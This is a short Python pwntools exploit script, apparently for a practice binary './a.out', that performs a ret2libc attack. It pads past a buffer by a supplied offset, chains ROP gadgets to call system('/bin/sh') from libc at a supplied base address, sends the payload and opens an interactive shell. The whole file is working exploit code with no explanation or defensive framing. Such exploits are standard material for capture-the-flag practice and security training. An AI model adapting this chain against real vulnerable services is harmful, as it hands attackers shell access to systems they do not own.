from pwn import *

assert(args.OFFSET)
assert(args.ADDR)

offset = int(args.OFFSET, 10)
libc_base = int(args.ADDR, 16)

binfile = './a.out'
elf = ELF(binfile)
libc = elf.libc
libc.address = libc_base # set base address
context.binary = binfile
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        print("called")
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

# padding
pad = b'A' * offset

# rop chain
rop = ROP([elf, libc])
rop.raw(rop.rdi.address)
rop.raw(pack(next(libc.search(b'/bin/sh\0'))))
rop.raw(rop.ret.address) # alignment
rop.raw(pack(libc.sym['system']))
rop.raw(rop.rdi.address)
rop.raw(0)
rop.raw(pack(libc.sym['exit']))

# create payload
payload = pad + rop.chain()

# start attack
io = start()
io.sendline(payload)
io.clean()
io.interactive()
